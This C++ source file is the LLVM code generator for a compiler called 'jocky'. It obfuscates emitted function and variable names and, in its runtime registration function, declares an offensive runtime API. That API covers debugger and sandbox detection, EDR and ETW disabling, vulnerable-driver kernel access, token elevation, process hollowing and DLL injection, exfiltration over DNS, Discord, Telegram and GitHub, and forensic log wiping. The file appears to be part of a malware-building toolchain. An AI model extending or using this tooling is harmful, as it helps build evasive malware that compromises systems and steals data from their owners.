#include "codegen.h"
#include <llvm/IR/Constants.h>
#include <llvm/IR/DerivedTypes.h>
#include <llvm/IR/Function.h>
#include <llvm/IR/GlobalVariable.h>
#include <llvm/IR/Verifier.h>
#include <llvm/Support/raw_ostream.h>

namespace jocky {

CodeGen::CodeGen(bool noRuntime_) : noRuntime(noRuntime_) {}

llvm::Type* CodeGen::llvmType(const JType& t) {
    llvm::Type* base = nullptr;
    switch (t.kind) {
        case JTypeKind::Void:   base = llvm::Type::getVoidTy(ctx); break;
        case JTypeKind::Bool:   base = llvm::Type::getInt1Ty(ctx); break;
        case JTypeKind::I8:     base = llvm::Type::getInt8Ty(ctx); break;
        case JTypeKind::I32:    base = llvm::Type::getInt32Ty(ctx); break;
        case JTypeKind::I64:    base = llvm::Type::getInt64Ty(ctx); break;
        case JTypeKind::String: base = llvm::Type::getInt8Ty(ctx); break;
        case JTypeKind::Custom: base = llvm::StructType::getTypeByName(ctx, t.customName); break;
        case JTypeKind::Pointer:
            return llvm::PointerType::get(ctx, 0);
    }
    if (!base) throw CodeGenError("Unknown type kind");
    if (t.isPointer || t.kind == JTypeKind::String)
        return llvm::PointerType::get(ctx, 0);
    return base;
}

bool CodeGen::isNumeric(const JType& t) const {
    return t.kind == JTypeKind::I8 || t.kind == JTypeKind::I32 || t.kind == JTypeKind::I64;
}

llvm::Value* CodeGen::emitCast(llvm::Value* val, const JType& from, const JType& to) {
    if (from.kind == to.kind && from.isPointer == to.isPointer) return val;

    llvm::Type* toTy = llvmType(to);

    if (from.kind == JTypeKind::Bool && isNumeric(to)) {
        return builder->CreateZExt(val, toTy, "cast");
    }
    if (isNumeric(from) && to.kind == JTypeKind::Bool) {
        return builder->CreateICmpNE(val, llvm::ConstantInt::get(val->getType(), 0), "cast");
    }
    if (isNumeric(from) && isNumeric(to)) {
        unsigned fromBits = val->getType()->getIntegerBitWidth();
        unsigned toBits = toTy->getIntegerBitWidth();
        if (fromBits < toBits)
            return builder->CreateSExt(val, toTy, "cast");
        else
            return builder->CreateTrunc(val, toTy, "cast");
    }
    if (from.isPointer && to.isPointer) {
        return builder->CreateBitCast(val, toTy, "cast");
    }
    throw CodeGenError("Unsupported cast");
}

std::unique_ptr<llvm::Module> CodeGen::generate(Program& prog, const std::string& moduleName) {
    mod = std::make_unique<llvm::Module>(moduleName, ctx);
    builder = std::make_unique<llvm::IRBuilder<>>(ctx);

    // Collect signatures
    for (auto& decl : prog.decls) {
        if (auto* fd = dynamic_cast<FuncDecl*>(decl.get())) {
            declareFunc(*fd);
        } else if (auto* ffi = dynamic_cast<FFIDecl*>(decl.get())) {
            declareFFI(*ffi);
        }
    }

    // Emit FFI declarations
    for (auto& decl : prog.decls) {
        if (auto* ffi = dynamic_cast<FFIDecl*>(decl.get())) {
            // Already declared, nothing more
            (void)ffi;
        }
    }

    // Declare runtime init function and all known runtime functions
    if (!noRuntime) {
        llvm::FunctionType* rtFT = llvm::FunctionType::get(
            llvm::Type::getInt32Ty(ctx), false);
        llvm::Function::Create(rtFT, llvm::Function::ExternalLinkage,
                               "jocky_runtime_init", mod.get());
        registerRuntimeFFI();
    }

    // Emit function bodies
    for (auto& decl : prog.decls) {
        if (auto* fd = dynamic_cast<FuncDecl*>(decl.get())) {
            emitFunc(*fd);
        }
    }

    // Verify module
    std::string err;
    llvm::raw_string_ostream errs(err);
    if (llvm::verifyModule(*mod, &errs)) {
        throw CodeGenError("Module verification failed: " + err);
    }

    return std::move(mod);
}

void CodeGen::declareFunc(FuncDecl& decl) {
    std::vector<llvm::Type*> paramTypes;
    for (auto& p : decl.params) {
        paramTypes.push_back(llvmType(p.type));
    }
    llvm::FunctionType* ft = llvm::FunctionType::get(llvmType(decl.retType), paramTypes, false);
    
    // Diversify function name (but keep main as-is for linker)
    std::string funcName = decl.name;
    if (decl.name != "main") {
        funcName = diversifier.diversify(decl.name);
    }
    
    llvm::Function* f = llvm::Function::Create(ft, llvm::Function::ExternalLinkage, funcName, mod.get());

    // Set parameter names (diversified)
    size_t i = 0;
    for (auto& arg : f->args()) {
        std::string paramName = diversifier.diversify(decl.params[i++].name);
        arg.setName(paramName);
    }

    FuncSig sig;
    for (auto& p : decl.params) sig.params.push_back(p.type);
    sig.ret = decl.retType;
    funcs[decl.name] = sig; // Store under original name for lookup
}

void CodeGen::declareFFI(FFIDecl& decl) {
    std::vector<llvm::Type*> paramTypes;
    for (auto& p : decl.params) {
        paramTypes.push_back(llvmType(p.type));
    }
    llvm::FunctionType* ft = llvm::FunctionType::get(llvmType(decl.retType), paramTypes, decl.variadic);
    llvm::Function::Create(ft, llvm::Function::ExternalLinkage, decl.name, mod.get());

    FuncSig sig;
    for (auto& p : decl.params) sig.params.push_back(p.type);
    sig.ret = decl.retType;
    funcs[decl.name] = sig;
}

void CodeGen::emitFunc(FuncDecl& decl) {
    std::string funcName = decl.name;
    if (decl.name != "main") {
        funcName = diversifier.diversify(decl.name);
    }
    
    llvm::Function* f = mod->getFunction(funcName);
    if (!f) throw CodeGenError("Function not found: " + funcName);
    currentFunc = f;

    llvm::BasicBlock* entry = llvm::BasicBlock::Create(ctx, diversifier.diversify("entry"), f);
    builder->SetInsertPoint(entry);
    locals.clear();

    // Inject runtime initialization at the start of main()
    if (decl.name == "main") {
        llvm::Function* rtInit = mod->getFunction("jocky_runtime_init");
        if (rtInit) {
            builder->CreateCall(rtInit, {}, diversifier.diversify("rt_init"));
        }
    }

    // Allocate and store parameters
    for (auto& arg : f->args()) {
        std::string name = arg.getName().str();
        llvm::AllocaInst* alloca = builder->CreateAlloca(arg.getType(), nullptr, diversifier.diversify(name + ".addr"));
        builder->CreateStore(&arg, alloca);
        JType t;
        for (auto& p : decl.params) {
            std::string divName = diversifier.diversify(p.name);
            if (divName == name || p.name == name) { t = p.type; break; }
        }
        locals[name] = {alloca, t};
    }

    emitBlock(*decl.body);

    // Ensure terminator
    if (!builder->GetInsertBlock()->getTerminator()) {
        if (decl.retType.kind == JTypeKind::Void) {
            builder->CreateRetVoid();
        } else {
            builder->CreateRet(llvm::ConstantInt::get(llvmType(decl.retType), 0));
        }
    }
}

void CodeGen::emitBlock(Block& block) {
    for (auto& stmt : block.stmts) {
        emitStmt(*stmt);
    }
}

void CodeGen::emitStmt(Stmt& stmt) {
    if (auto* let = dynamic_cast<LetStmt*>(&stmt)) {
        JType t = let->type;
        if (t.kind == JTypeKind::Void) {
            t = JType::makeI32(); // default fallback
        }
        llvm::Value* val = emitExpr(*let->init);
        std::string divName = diversifier.diversify(let->name);
        llvm::AllocaInst* alloca = builder->CreateAlloca(llvmType(t), nullptr, divName);
        builder->CreateStore(val, alloca);
        locals[let->name] = {alloca, t}; // Store under original name for lookup
    }
    else if (auto* assign = dynamic_cast<AssignStmt*>(&stmt)) {
        if (auto* vr = dynamic_cast<VarRef*>(assign->target.get())) {
            auto it = locals.find(vr->name);
            if (it == locals.end()) throw CodeGenError("Undefined variable: " + vr->name);
            llvm::Value* val = emitExpr(*assign->value);
            builder->CreateStore(val, it->second.alloca);
        } else {
            throw CodeGenError("Unsupported assignment target");
        }
    }
    else if (auto* ifs = dynamic_cast<IfStmt*>(&stmt)) {
        llvm::Value* cond = emitExpr(*ifs->cond);
        llvm::Function* f = builder->GetInsertBlock()->getParent();
        llvm::BasicBlock* thenBB = llvm::BasicBlock::Create(ctx, diversifier.diversify("then"), f);
        llvm::BasicBlock* elseBB = ifs->elseBlock ? llvm::BasicBlock::Create(ctx, diversifier.diversify("else"), f) : nullptr;
        llvm::BasicBlock* mergeBB = llvm::BasicBlock::Create(ctx, diversifier.diversify("merge"), f);

        if (elseBB) {
            builder->CreateCondBr(cond, thenBB, elseBB);
        } else {
            builder->CreateCondBr(cond, thenBB, mergeBB);
        }

        builder->SetInsertPoint(thenBB);
        emitBlock(*ifs->thenBlock);
        if (!builder->GetInsertBlock()->getTerminator())
            builder->CreateBr(mergeBB);

        if (elseBB) {
            builder->SetInsertPoint(elseBB);
            emitBlock(*ifs->elseBlock);
            if (!builder->GetInsertBlock()->getTerminator())
                builder->CreateBr(mergeBB);
        }

        builder->SetInsertPoint(mergeBB);
    }
    else if (auto* wh = dynamic_cast<WhileStmt*>(&stmt)) {
        llvm::Function* f = builder->GetInsertBlock()->getParent();
        llvm::BasicBlock* headerBB = llvm::BasicBlock::Create(ctx, diversifier.diversify("while.cond"), f);
        llvm::BasicBlock* bodyBB = llvm::BasicBlock::Create(ctx, diversifier.diversify("while.body"), f);
        llvm::BasicBlock* endBB = llvm::BasicBlock::Create(ctx, diversifier.diversify("while.end"), f);

        builder->CreateBr(headerBB);
        builder->SetInsertPoint(headerBB);
        llvm::Value* cond = emitExpr(*wh->cond);
        builder->CreateCondBr(cond, bodyBB, endBB);

        builder->SetInsertPoint(bodyBB);
        emitBlock(*wh->body);
        if (!builder->GetInsertBlock()->getTerminator())
            builder->CreateBr(headerBB);

        builder->SetInsertPoint(endBB);
    }
    else if (auto* ret = dynamic_cast<ReturnStmt*>(&stmt)) {
        if (ret->value) {
            builder->CreateRet(emitExpr(*ret->value));
        } else {
            builder->CreateRetVoid();
        }
    }
    else if (auto* es = dynamic_cast<ExprStmt*>(&stmt)) {
        emitExpr(*es->expr);
    }
}

llvm::Value* CodeGen::emitExpr(Expr& expr) {
    if (auto* lit = dynamic_cast<IntLiteral*>(&expr)) {
        return llvm::ConstantInt::get(llvm::Type::getInt32Ty(ctx), lit->value);
    }
    if (auto* bl = dynamic_cast<BoolLiteral*>(&expr)) {
        return llvm::ConstantInt::get(llvm::Type::getInt1Ty(ctx), bl->value ? 1 : 0);
    }
    if (auto* sl = dynamic_cast<StringLiteral*>(&expr)) {
        return builder->CreateGlobalString(sl->value, ".str", 0, mod.get());
    }
    if (auto* vr = dynamic_cast<VarRef*>(&expr)) {
        auto it = locals.find(vr->name);
        if (it == locals.end()) throw CodeGenError("Undefined variable: " + vr->name);
        return builder->CreateLoad(llvmType(it->second.type), it->second.alloca, vr->name);
    }
    if (auto* bin = dynamic_cast<BinaryOp*>(&expr)) {
        return emitBinary(*bin);
    }
    if (auto* un = dynamic_cast<UnaryOp*>(&expr)) {
        return emitUnary(*un);
    }
    if (auto* call = dynamic_cast<CallExpr*>(&expr)) {
        return emitCall(*call);
    }
    if (auto* deref = dynamic_cast<DerefExpr*>(&expr)) {
        llvm::Value* ptr = emitExpr(*deref->operand);
        JType ptrTy = inferType(*deref->operand);
        JType elemTy = ptrTy;
        elemTy.isPointer = false;
        return builder->CreateLoad(llvmType(elemTy), ptr, "deref");
    }
    if (auto* addr = dynamic_cast<AddrOfExpr*>(&expr)) {
        if (auto* vr = dynamic_cast<VarRef*>(addr->operand.get())) {
            auto it = locals.find(vr->name);
            if (it == locals.end()) throw CodeGenError("Undefined variable: " + vr->name);
            return it->second.alloca;
        }
        throw CodeGenError("Can only take address of variables");
    }
    if (auto* cast = dynamic_cast<CastExpr*>(&expr)) {
        llvm::Value* val = emitExpr(*cast->operand);
        // Infer source type from operand
        JType from = inferType(*cast->operand);
        return emitCast(val, from, cast->targetType);
    }
    if (auto* idx = dynamic_cast<IndexExpr*>(&expr)) {
        llvm::Value* base = emitExpr(*idx->base);
        llvm::Value* index = emitExpr(*idx->index);
        JType baseTy = inferType(*idx->base);
        JType elemTy = baseTy;
        elemTy.isPointer = false;
        llvm::Value* gep = builder->CreateGEP(llvmType(elemTy), base, index, "idx");
        return builder->CreateLoad(llvmType(elemTy), gep, "idxload");
    }
    throw CodeGenError("Unknown expression type");
}

llvm::Value* CodeGen::emitBinary(BinaryOp& op) {
    llvm::Value* L = emitExpr(*op.left);
    llvm::Value* R = emitExpr(*op.right);

    if (op.op == "+") return builder->CreateAdd(L, R, "add");
    if (op.op == "-") return builder->CreateSub(L, R, "sub");
    if (op.op == "*") return builder->CreateMul(L, R, "mul");
    if (op.op == "/") return builder->CreateSDiv(L, R, "div");
    if (op.op == "%") return builder->CreateSRem(L, R, "rem");
    if (op.op == "==") return builder->CreateICmpEQ(L, R, "eq");
    if (op.op == "!=") return builder->CreateICmpNE(L, R, "ne");
    if (op.op == "<")  return builder->CreateICmpSLT(L, R, "lt");
    if (op.op == ">")  return builder->CreateICmpSGT(L, R, "gt");
    if (op.op == "<=") return builder->CreateICmpSLE(L, R, "le");
    if (op.op == ">=") return builder->CreateICmpSGE(L, R, "ge");
    if (op.op == "&&") return builder->CreateAnd(L, R, "and");
    if (op.op == "||") return builder->CreateOr(L, R, "or");

    throw CodeGenError("Unknown binary operator: " + op.op);
}

llvm::Value* CodeGen::emitUnary(UnaryOp& op) {
    if (op.op == "*") {
        // Dereference: operand is a pointer, load from it
        llvm::Value* ptr = emitExpr(*op.operand);
        JType ptrTy = inferType(*op.operand);
        JType elemTy = ptrTy;
        elemTy.isPointer = false;
        return builder->CreateLoad(llvmType(elemTy), ptr, "deref");
    }
    if (op.op == "&") {
        // Address-of: operand must be a variable
        if (auto* vr = dynamic_cast<VarRef*>(op.operand.get())) {
            auto it = locals.find(vr->name);
            if (it == locals.end()) throw CodeGenError("Undefined variable: " + vr->name);
            return it->second.alloca;
        }
        throw CodeGenError("Can only take address of variables");
    }
    llvm::Value* V = emitExpr(*op.operand);
    if (op.op == "-") {
        return builder->CreateNeg(V, "neg");
    }
    if (op.op == "!") {
        return builder->CreateXor(V, llvm::ConstantInt::get(V->getType(), 1), "not");
    }
    throw CodeGenError("Unknown unary operator: " + op.op);
}

JType CodeGen::inferType(Expr& expr) {
    if (dynamic_cast<IntLiteral*>(&expr)) return JType::makeI32();
    if (dynamic_cast<BoolLiteral*>(&expr)) return JType::makeBool();
    if (dynamic_cast<StringLiteral*>(&expr)) return JType::makeString();
    if (auto* vr = dynamic_cast<VarRef*>(&expr)) {
        auto it = locals.find(vr->name);
        if (it != locals.end()) return it->second.type;
        throw CodeGenError("Undefined variable in inferType: " + vr->name);
    }
    if (auto* call = dynamic_cast<CallExpr*>(&expr)) {
        auto it = funcs.find(call->name);
        if (it != funcs.end()) return it->second.ret;
        throw CodeGenError("Unknown function in inferType: " + call->name);
    }
    if (auto* cast = dynamic_cast<CastExpr*>(&expr)) {
        return cast->targetType;
    }
    if (auto* deref = dynamic_cast<DerefExpr*>(&expr)) {
        JType inner = inferType(*deref->operand);
        if (inner.isPointer || inner.kind == JTypeKind::String) {
            inner.isPointer = false;
            return inner;
        }
        throw CodeGenError("Cannot dereference non-pointer");
    }
    if (auto* idx = dynamic_cast<IndexExpr*>(&expr)) {
        JType base = inferType(*idx->base);
        base.isPointer = false;
        return base;
    }
    if (auto* bin = dynamic_cast<BinaryOp*>(&expr)) {
        if (bin->op == "&&" || bin->op == "||" ||
            bin->op == "==" || bin->op == "!=" ||
            bin->op == "<"  || bin->op == ">" ||
            bin->op == "<=" || bin->op == ">=") {
            return JType::makeBool();
        }
        return inferType(*bin->left);
    }
    if (auto* un = dynamic_cast<UnaryOp*>(&expr)) {
        if (un->op == "!") return JType::makeBool();
        if (un->op == "*") {
            JType inner = inferType(*un->operand);
            if (inner.isPointer || inner.kind == JTypeKind::String) {
                inner.isPointer = false;
                return inner;
            }
        }
        if (un->op == "&") {
            JType inner = inferType(*un->operand);
            return JType::makePtr(inner);
        }
        return inferType(*un->operand);
    }
    throw CodeGenError("Cannot infer type");
}

llvm::Value* CodeGen::emitCall(CallExpr& call) {
    llvm::Function* f = mod->getFunction(call.name);
    if (!f) throw CodeGenError("Undefined function: " + call.name);

    std::vector<llvm::Value*> args;
    for (auto& arg : call.args) {
        args.push_back(emitExpr(*arg));
    }

    return builder->CreateCall(f, args, call.name + "_call");
}

void CodeGen::registerRuntimeFFI() {
    auto* llvmI1  = llvm::Type::getInt1Ty(ctx);
    auto* llvmI8  = llvm::Type::getInt8Ty(ctx);
    auto* llvmI32 = llvm::Type::getInt32Ty(ctx);
    auto* llvmI64 = llvm::Type::getInt64Ty(ctx);
    auto* llvmPtr = llvm::PointerType::get(ctx, 0);
    auto* llvmVd  = llvm::Type::getVoidTy(ctx);

    JType jtVoid = JType::makeVoid();
    JType jtBool = JType::makeBool();
    JType jtI8   = JType::makeI8();
    JType jtI32  = JType::makeI32();
    JType jtI64  = JType::makeI64();
    JType jtPtr  = JType::makePtr(JType::makeI8());

    /* Create an external LLVM declaration and register in the funcs map.
     * Skips LLVM creation if the function already exists (e.g. runtime_init),
     * but always updates the funcs map so inferType() works for call sites. */
    auto decl = [&](const char* name,
                    llvm::Type* retLLVM, JType retJT,
                    std::initializer_list<llvm::Type*> llvmParams,
                    std::initializer_list<JType> jtParams) {
        if (!mod->getFunction(name)) {
            auto* ft = llvm::FunctionType::get(retLLVM,
                llvm::ArrayRef<llvm::Type*>(llvmParams), false);
            llvm::Function::Create(ft, llvm::Function::ExternalLinkage,
                                   name, mod.get());
        }
        FuncSig sig;
        sig.ret = retJT;
        for (const auto& p : jtParams) sig.params.push_back(p);
        funcs[name] = sig;
    };

    // ── Runtime init ─────────────────────────────────────────────────────
    decl("jocky_runtime_init", llvmI32, jtI32, {}, {});

    // ── Anti-analysis ────────────────────────────────────────────────────
    decl("jocky_check_analysis_environment", llvmI32, jtI32, {}, {});
    decl("jocky_is_debugger_present",        llvmI1,  jtBool, {}, {});
    decl("jocky_is_remote_debugger",         llvmI1,  jtBool, {}, {});
    decl("jocky_check_hardware_breakpoints", llvmI1,  jtBool, {}, {});
    decl("jocky_is_vm",                      llvmI1,  jtBool, {}, {});
    decl("jocky_is_sandbox",                 llvmI1,  jtBool, {}, {});
    decl("jocky_check_timing_rdtsc",         llvmI1,  jtBool, {}, {});
    decl("jocky_check_timing_api",           llvmI1,  jtBool, {}, {});

    // ── Evasion ──────────────────────────────────────────────────────────
    decl("jocky_unhook_ntdll",       llvmI1,  jtBool, {}, {});
    decl("jocky_get_syscall_number", llvmI32, jtI32,  {llvmPtr}, {jtPtr});
    decl("jocky_get_syscall_num",    llvmI32, jtI32,  {llvmPtr}, {jtPtr});
    decl("jocky_direct_syscall",     llvmI64, jtI64,
         {llvmI32, llvmI64, llvmI64, llvmI64, llvmI64},
         {jtI32,  jtI64,  jtI64,  jtI64,  jtI64});
    decl("jocky_direct_syscall4",    llvmI64, jtI64,
         {llvmI32, llvmI64, llvmI64, llvmI64, llvmI64},
         {jtI32,  jtI64,  jtI64,  jtI64,  jtI64});
    decl("jocky_find_ret_gadget",    llvmPtr, jtPtr,  {}, {});
    decl("jocky_spoof_call",         llvmI64, jtI64,
         {llvmPtr, llvmI64, llvmI64, llvmI64, llvmI64},
         {jtPtr,  jtI64,  jtI64,  jtI64,  jtI64});
    decl("jocky_spoof_syscall",      llvmI64, jtI64,
         {llvmI32, llvmI64, llvmI64, llvmI64, llvmI64},
         {jtI32,  jtI64,  jtI64,  jtI64,  jtI64});

    // ── BYOVD / Driver interaction ────────────────────────────────────────
    decl("jocky_byovd_load",        llvmI1, jtBool,
         {llvmPtr, llvmPtr, llvmPtr}, {jtPtr, jtPtr, jtPtr});
    decl("jocky_byovd_unload",      llvmVd, jtVoid,  {llvmPtr}, {jtPtr});
    decl("jocky_manifest_load",     llvmI1, jtBool,  {}, {});
    decl("jocky_driver_read_phys",  llvmI1, jtBool,
         {llvmPtr, llvmI64, llvmPtr, llvmI32}, {jtPtr, jtI64, jtPtr, jtI32});
    decl("jocky_driver_write_phys", llvmI1, jtBool,
         {llvmPtr, llvmI64, llvmPtr, llvmI32}, {jtPtr, jtI64, jtPtr, jtI32});
    decl("jocky_driver_read_msr",   llvmI1, jtBool,
         {llvmPtr, llvmI32, llvmPtr}, {jtPtr, jtI32, jtPtr});
    decl("jocky_driver_write_msr",  llvmI1, jtBool,
         {llvmPtr, llvmI32, llvmI64}, {jtPtr, jtI32, jtI64});
    decl("jocky_driver_map_phys",   llvmI1, jtBool,
         {llvmPtr, llvmI64, llvmI32, llvmPtr}, {jtPtr, jtI64, jtI32, jtPtr});
    decl("jocky_driver_invoke",     llvmI1, jtBool,
         {llvmPtr, llvmPtr, llvmPtr, llvmI32, llvmPtr, llvmI32},
         {jtPtr,  jtPtr,  jtPtr,  jtI32,  jtPtr,  jtI32});

    // ── Kernel exploitation ───────────────────────────────────────────────
    decl("jocky_kread",                 llvmI1, jtBool,
         {llvmPtr, llvmI64, llvmPtr, llvmI32}, {jtPtr, jtI64, jtPtr, jtI32});
    decl("jocky_kwrite",                llvmI1, jtBool,
         {llvmPtr, llvmI64, llvmPtr, llvmI32}, {jtPtr, jtI64, jtPtr, jtI32});
    decl("jocky_disable_edr_callbacks", llvmI1, jtBool, {llvmPtr}, {jtPtr});
    decl("jocky_disable_etw",           llvmI1, jtBool, {llvmPtr}, {jtPtr});
    decl("jocky_disable_etw_ti",        llvmI1, jtBool, {llvmPtr}, {jtPtr});
    decl("jocky_disable_ob_callbacks",  llvmI1, jtBool, {llvmPtr}, {jtPtr});
    decl("jocky_strip_ppl",             llvmI1, jtBool,
         {llvmPtr, llvmI32}, {jtPtr, jtI32});
    decl("jocky_elevate_token",         llvmI1, jtBool,
         {llvmPtr, llvmI32}, {jtPtr, jtI32});
    decl("jocky_downgrade_token",       llvmI1, jtBool,
         {llvmPtr, llvmI32}, {jtPtr, jtI32});
    decl("jocky_disable_dse",           llvmI1, jtBool, {llvmPtr}, {jtPtr});
    decl("jocky_restore_dse",           llvmI1, jtBool, {llvmPtr}, {jtPtr});

    // ── In-memory execution ───────────────────────────────────────────────
    decl("jocky_process_hollow", llvmI1, jtBool,
         {llvmPtr, llvmPtr, llvmI64}, {jtPtr, jtPtr, jtI64});
    decl("jocky_module_stomp",   llvmI1, jtBool,
         {llvmI32, llvmPtr, llvmPtr, llvmI64}, {jtI32, jtPtr, jtPtr, jtI64});
    decl("jocky_rdll_inject",    llvmI1, jtBool,
         {llvmI32, llvmPtr, llvmI64}, {jtI32, jtPtr, jtI64});
    decl("jocky_p3_poison",      llvmI1, jtBool,
         {llvmI32, llvmPtr, llvmPtr}, {jtI32, jtPtr, jtPtr});
    decl("jocky_thread_hijack",  llvmI1, jtBool,
         {llvmI32, llvmPtr, llvmI64}, {jtI32, jtPtr, jtI64});

    // ── Exfiltration ──────────────────────────────────────────────────────
    decl("jocky_exfil_encrypt",  llvmI1, jtBool,
         {llvmPtr, llvmI64, llvmPtr, llvmPtr}, {jtPtr, jtI64, jtPtr, jtPtr});
    decl("jocky_exfil_front",    llvmI1, jtBool,
         {llvmPtr, llvmPtr, llvmPtr, llvmPtr, llvmI64},
         {jtPtr,  jtPtr,  jtPtr,  jtPtr,  jtI64});
    decl("jocky_exfil_dns",      llvmI1, jtBool,
         {llvmPtr, llvmPtr, llvmI64}, {jtPtr, jtPtr, jtI64});
    decl("jocky_exfil_discord",  llvmI1, jtBool,
         {llvmPtr, llvmPtr, llvmI64}, {jtPtr, jtPtr, jtI64});
    decl("jocky_exfil_telegram", llvmI1, jtBool,
         {llvmPtr, llvmPtr, llvmPtr, llvmI64}, {jtPtr, jtPtr, jtPtr, jtI64});
    decl("jocky_exfil_github",   llvmI1, jtBool,
         {llvmPtr, llvmPtr, llvmPtr, llvmI64}, {jtPtr, jtPtr, jtPtr, jtI64});

    // ── Cleanup / Anti-forensics ──────────────────────────────────────────
    decl("jocky_self_delete",     llvmI1, jtBool, {}, {});
    decl("jocky_clear_logs",      llvmI1, jtBool, {}, {});
    decl("jocky_wipe_artifacts",  llvmI1, jtBool, {}, {});
    decl("jocky_wipe_prefetch",   llvmI1, jtBool, {}, {});
    decl("jocky_patch_shimcache", llvmI1, jtBool, {}, {});
    decl("jocky_patch_amcache",   llvmI1, jtBool, {}, {});
    decl("jocky_clear_srum",      llvmI1, jtBool, {}, {});
    decl("jocky_cleanup_all",     llvmI1, jtBool, {}, {});

    // ── Crypto ────────────────────────────────────────────────────────────
    decl("jocky_decrypt_xor", llvmVd, jtVoid,
         {llvmPtr, llvmI64, llvmI8}, {jtPtr, jtI64, jtI8});
    decl("jocky_decrypt_rc4", llvmVd, jtVoid,
         {llvmPtr, llvmI64, llvmPtr, llvmI64}, {jtPtr, jtI64, jtPtr, jtI64});

    // ── Integrity ─────────────────────────────────────────────────────────
    decl("jocky_verify_integrity", llvmI1, jtBool, {}, {});

    // ── Allocators ────────────────────────────────────────────────────────
    decl("jocky_alloc",         llvmPtr, jtPtr,  {llvmI64}, {jtI64});
    decl("jocky_free",          llvmVd,  jtVoid, {llvmPtr}, {jtPtr});
    decl("jocky_byovd_new",     llvmPtr, jtPtr,  {}, {});
    decl("jocky_byovd_destroy", llvmVd,  jtVoid, {llvmPtr}, {jtPtr});
}

} // namespace jocky
